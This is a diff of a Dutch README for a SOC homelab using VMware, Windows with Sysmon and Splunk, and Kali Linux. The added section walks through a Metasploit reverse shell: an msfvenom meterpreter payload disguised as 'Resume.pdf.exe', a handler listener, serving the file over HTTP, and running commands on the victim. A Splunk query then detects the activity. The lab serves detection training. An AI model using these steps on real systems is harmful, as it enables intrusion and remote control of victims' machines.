@@ -1,164 +1,219 @@
-# Cybersecurity SOC Homelab
+## Cybersecurity SOC Homelab
 
-Een beknopte maar complete handleiding voor het opzetten van een eigen **SOC-homelab** met **VMware Workstation**, Windows (Sysmon + Splunk) en Kali Linux. Ontworpen om veilig te oefenen met loganalyse, detecties en netwerkgedrag zonder risico voor je host of netwerk.
+Een praktische en veilige Security Operations Center (SOC) oefenomgeving gebouwd met VMware, Windows (Sysmon + Splunk) en Kali Linux.
+Deze homelab is ontworpen om te leren hoe je loganalyse, detectie en incidentanalyse uitvoert — zonder risico voor je eigen netwerk of hostmachine.
 
----
+🎯 Doelstelling
 
-## Doelstelling
+Het doel van dit project is het opzetten van een gecontroleerde omgeving waarin je leert:
 
-Het project richt zich op het creëren van een gecontroleerde omgeving voor:
+Logbestanden verzamelen en analyseren in Splunk.
 
-* Het verzamelen en analyseren van logbestanden in **Splunk**.
-* Het veilig genereren van **telemetrie** (processen, netwerkverkeer, poortscans).
-* Het leren interpreteren van Sysmon- en Splunk-events voor detectie en incidentanalyse.
+Telemetrie genereren via netwerkactiviteit, processen en aanvallen.
 
----
+Sysmon- en Splunk-events interpreteren voor detectie en incidentrespons.
 
-## Vaardigheden
+## Ontwikkelde Vaardigheden
 
-Tijdens dit project ontwikkel je:
+Inzicht in SIEM-principes (logverzameling, indexering, correlatie).
 
-* Inzicht in SIEM-principes (logverzameling, indexering, correlatie).
-* Vaardigheid in het opzetten van virtuele netwerken en snapshots in **VMware**.
-* Ervaring met **Sysmon** en **Windows Event Logging**.
-* Basiskennis van detectieregels en SPL-query’s in **Splunk**.
+Virtuele netwerken ontwerpen en snapshots beheren in VMware.
 
----
+Werken met Sysmon en Windows Event Logging.
 
-## Tools
+Detectieregels schrijven en SPL-query’s gebruiken in Splunk.
 
-* **VMware Workstation Pro / Player** – virtualisatieplatform.
-* **Windows 10/11 VM** – endpoint met Sysmon en Splunk.
-* **Kali Linux VM** – aanvaller/testmachine.
-* **Splunk Enterprise/Free** – loganalyse.
-* **Splunk Add-on for Sysmon** – automatische veldextracties.
-
----
-
-## Architectuur
-
-```
+## Gebruikte Tools
+Tool	Functie
+VMware Workstation Pro / Player	Virtualisatieplatform
+Windows 10/11 VM	Endpoint met Sysmon en Splunk
+Kali Linux VM	Aanvaller/testmachine
+Splunk Enterprise / Free	Logverzameling en -analyse
+Sysmon + Splunk Add-on	Verrijkte proces- en netwerkloggegevens
+## Lab Architectuur
 [Host PC]
  └── VMware Workstation
       ├── VM1: Windows (Sysmon + Splunk)
-      └── VM2: Kali Linux (nmap, benign tests)
+      └── VM2: Kali Linux (nmap, reverse shell test)
+
 
 Netwerkopties:
-- NAT / Bridged → voor beginners met internettoegang.
-- LAN Segment → geïsoleerd, veilig voor testscenario’s.
-```
 
-<img width="729" height="567" alt="image" src="https://github.com/user-attachments/assets/9f145dd1-5c41-4abb-98d1-483fc3cd3e3a" />
+NAT / Bridged → toegang tot internet (optioneel)
 
+LAN Segment → volledig geïsoleerd, aanbevolen voor security-tests
 
----
-
-## Stappenplan
-
-### 1️⃣ VMware installeren
-
-1. Download **VMware Workstation Pro** of **Player**.
-2. Installeer met standaardinstellingen.
-3. Controleer of virtualisatie in de BIOS aanstaat.
+<img width="729" height="567" alt="lab-topology" src="https://github.com/user-attachments/assets/9f145dd1-5c41-4abb-98d1-483fc3cd3e3a" />
 
 
-### 2️⃣ Windows VM aanmaken
+## Installatiestappen
 
-* Naam: `WIN-SOC`
-* 2–4 vCPU’s, 4–8 GB RAM, 50 GB disk.
-* Koppel de Windows ISO via *CD/DVD (SATA)*.
-* Installeer **VMware Tools** na installatie voor betere integratie.
-  <img width="577" height="795" alt="image" src="https://github.com/user-attachments/assets/103ea3c8-bbc5-42fc-8048-3c88f7a9fd8b" />
+1️⃣ VMware installeren
 
+Download VMware Workstation Pro / Player.
 
-### 3️⃣ Kali Linux importeren
+Installeer met standaardinstellingen.
 
-* Download de officiële **Kali VMware image (7z)**.
-* Pak uit met 7‑Zip en open `.vmx` in VMware.
-* Login: `kali` / `kali`.
-  <img width="1277" height="840" alt="image" src="https://github.com/user-attachments/assets/99388a8c-cc67-4e16-b153-7226067722a4" />
+Controleer dat virtualisatie (VT-x/AMD-V) is ingeschakeld in de BIOS.
 
+2️⃣ Windows VM aanmaken
 
-### 4️⃣ Netwerk instellen
+Naam: WIN-SOC
 
-Gebruik een **LAN Segment** of **Host‑Only Network**.
+2–4 vCPU’s, 4–8 GB RAM, 50 GB opslag.
 
-* Windows: `192.168.20.10/24`
-* Kali: `192.168.1.2/24`
-* Geen gateway of DNS nodig.
+Koppel Windows ISO → installeer Windows.
 
+Installeer VMware Tools na installatie.
 
-Test verbinding:
+3️⃣ Kali Linux VM importeren
 
-```cmd
-ping 192.168.1.2
-```
+Download officiële Kali VMware image (.7z).
 
-(werkt alleen als Windows-firewall ICMP toelaat).
-<img width="636" height="301" alt="image" src="https://github.com/user-attachments/assets/d942d32c-ba6e-4cb6-b094-cb49b420dda3" />
+Pak uit en open .vmx in VMware.
 
+Standaard inlog: kali / kali.
 
-### 5️⃣ Snapshot maken
+4️⃣ Netwerk instellen
 
-Voordat je verder gaat: VMware → **Snapshot → Take Snapshot → Baseline**.
+Gebruik een Host-Only of LAN Segment netwerk:
 
+VM	IP	Subnet
+Windows	192.168.20.10	/24
+Kali	192.168.20.11	/24
 
-### 6️⃣ Splunk + Sysmon op Windows
+Verbinding testen:
 
-1. Installeer **Splunk** en start de webinterface (`http://127.0.0.1:8000`).
-2. Maak index `endpoint` aan.
-3. Installeer **Sysmon** met een gangbare configuratie (bijv. SwiftOnSecurity).
-4. Voeg toe aan `inputs.conf`:
-
-   ```ini
-   [WinEventLog://Microsoft-Windows-Sysmon/Operational]
-   index = endpoint
-   renderXml = true
-   disabled = 0
-   ```
-5. Herstart Splunk-service en controleer of Sysmon‑logs zichtbaar zijn.
-   <img width="1808" height="1290" alt="image" src="https://github.com/user-attachments/assets/cbade74e-93f2-4a11-aa5a-b6949770e8a0" />
+ping 192.168.20.10
 
 
----
+(Let op: Windows Firewall moet ICMP toestaan.)
 
-## Telemetrie genereren (veilig)
+5️⃣ Snapshot maken
 
-### 🧩 Netwerkscan met nmap (Kali)
+Maak een baseline snapshot van beide VM’s:
+VMware → Snapshot → Take Snapshot → Baseline
 
-```bash
-nmap -A -Pn 192.168.20.10
-```
+6️⃣ Splunk & Sysmon installeren (Windows)
 
-Gebruik dit alleen binnen je eigen lab.
-*Ref 13 → images/13_nmap_results.png*
+Installeer Splunk Enterprise en open http://127.0.0.1:8000.
 
-### 🧩 Procesactiviteit (Windows)
+Maak een nieuwe index aan: endpoint.
 
-In CMD of PowerShell:
+Installeer Sysmon (bijv. met SwiftOnSecurity-config).
 
-```
-whoami
-ipconfig /all
+Voeg toe aan inputs.conf:
+
+[WinEventLog://Microsoft-Windows-Sysmon/Operational]
+index = endpoint
+renderXml = true
+disabled = 0
+
+
+Herstart Splunk-service en controleer of Sysmon-events zichtbaar zijn.
+
+## 7️⃣ Kali Demo — Reverse Shell Simulatie
+
+In deze demo genereer je telemetrie door een gecontroleerde reverse shell-aanval op het Windows-systeem uit te voeren.
+De logs hiervan worden later in Splunk geanalyseerd.
+
+🔹 Stap 1 — Payload-opties bekijken
+msfvenom -l payloads
+
+
+Toont een lijst met beschikbare payloads in Metasploit.
+Handig om te zien welke type shell of exploit je kunt genereren.
+
+🔹 Stap 2 — Payload aanmaken
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o Resume.pdf.exe
+
+
+Genereert een Windows-executable die een reverse shell terugstuurt naar de Kali IP op poort 4444.
+De payload wordt opgeslagen als Resume.pdf.exe.
+
+🔹 Stap 3 — Metasploit starten
+msfconsole
+
+
+Start het Metasploit Framework om de reverse shell-verbinding te kunnen ontvangen.
+
+🔹 Stap 4 — Handler instellen
+use exploit/multi/handler
+
+
+Activeert een generieke listener die inkomende shells opvangt.
+
+🔹 Stap 5 — Opties bekijken
+options
+
+
+Laat alle configureerbare parameters zien van de exploit-handler.
+
+🔹 Stap 6 — Payload en IP configureren
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost <kali_ip>
+
+
+Bepaalt welk payloadtype en IP-adres gebruikt wordt voor de connectie.
+
+🔹 Stap 7 — Exploit uitvoeren
+exploit
+
+
+Start de listener.
+Zodra het doelbestand op Windows wordt uitgevoerd, opent de shell terug naar Kali.
+
+🔹 Stap 8 — HTTP-server starten
+python3 -m http.server 9999
+
+
+Start een eenvoudige webserver op poort 9999 om het Resume.pdf.exe bestand te hosten.
+Windows kan dit bestand via de browser downloaden.
+
+🔹 Stap 9 — Payload uitvoeren (Windows)
+
+Open op Windows de browser.
+
+Navigeer naar http://<kali_ip>:9999/Resume.pdf.exe.
+
+Download en voer het bestand uit.
+
+Na uitvoering verschijnt op Kali:
+
+[*] Meterpreter session 1 opened
+
+🔹 Stap 10 — Basiscommando’s uitvoeren
+
+In de Meterpreter-shell:
+
+shell
 net user
-net localgroup administrators
-```
-
-Splunk zal Sysmon Event ID 1 (Process Create) registreren.
-<img width="900" height="1233" alt="image" src="https://github.com/user-attachments/assets/86464162-d99b-4f0e-af1e-c6d18655c14f" />
+net group
 
 
----
+Deze acties genereren logactiviteit (proces- en netwerkverbindingen).
+Splunk registreert deze als Sysmon Event ID 1 (Process Create) en Event ID 3 (Network Connect).
 
-## Splunk-query’s
+## Analyse in Splunk
 
-**Procescreatie:**
+Gebruik bijvoorbeeld:
 
-```spl
-index=endpoint EventCode=1
-| stats values(CommandLine) by Image, ParentImage, user
-```
-<img width="2552" height="1248" alt="image" src="https://github.com/user-attachments/assets/e7928269-c299-470d-8664-08ebab1e72ae" />
+index=endpoint Image="*Resume.pdf.exe*" OR CommandLine="*net user*"
+
+
+Hiermee vind je de processen die door de aanval zijn gestart.
 
 Hier zie je dat de pdf.exe gebruikt was om Reverse shell uit te voeren
 
+<img width="2552" height="1248" alt="splunk-result" src="https://github.com/user-attachments/assets/e7928269-c299-470d-8664-08ebab1e72ae" />
+
+
+##Belangrijkste Leerpunten
+
+✅ Sysmon biedt onmisbare context (Process Create, Network Connect, Registry Changes).
+
+✅ Splunk maakt snelle correlatie van gedrag en events mogelijk.
+
+✅ Geïsoleerd netwerk voorkomt impact op je eigen host.
+
+✅ Iteratief testen met eenvoudige scripts versnelt je leerproces.
